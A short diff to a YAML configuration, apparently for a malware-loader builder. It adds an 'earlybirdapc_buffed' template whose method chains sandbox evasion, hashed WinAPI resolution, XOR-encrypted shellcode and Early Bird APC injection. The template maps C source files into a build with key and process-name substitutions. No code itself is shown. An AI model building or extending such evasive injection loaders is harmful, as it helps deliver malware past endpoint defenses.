@@ -218,3 +218,33 @@ loader_template:
 
       - sourcePath: "makefile"
         outputPath: "makefile"
+  - token: "earlybirdapc_buffed"
+    key_required: true
+    method: "Sandbox Evasion -> WinAPI Resolution -> XOR Shellcode -> Early Bird APC Injection -> Resume Thread"
+    files:
+      - sourcePath: "Source/EarlyBirdAPC_Buffed.c"
+        outputPath: "Main.c"
+        substitutions:
+          key: ${ KEY }
+          pname: ${ PNAME }
+
+      - sourcePath: "Source/Hash.c"
+        outputPath: "Hash.c"
+
+      - sourcePath: "Source/Xor.c"
+        outputPath: "Xor.c"
+
+      - sourcePath: "Source/Iat.c"
+        outputPath: "Iat.c"
+      
+      - sourcePath: "Include/Hash.h"
+        outputPath: "Hash.h"
+
+      - sourcePath: "Include/Xor.h"
+        outputPath: "Xor.h"
+      
+      - sourcePath: "Include/Iat.h"
+        outputPath: "Iat.h"
+
+      - sourcePath: "makefile"
+        outputPath: "makefile"
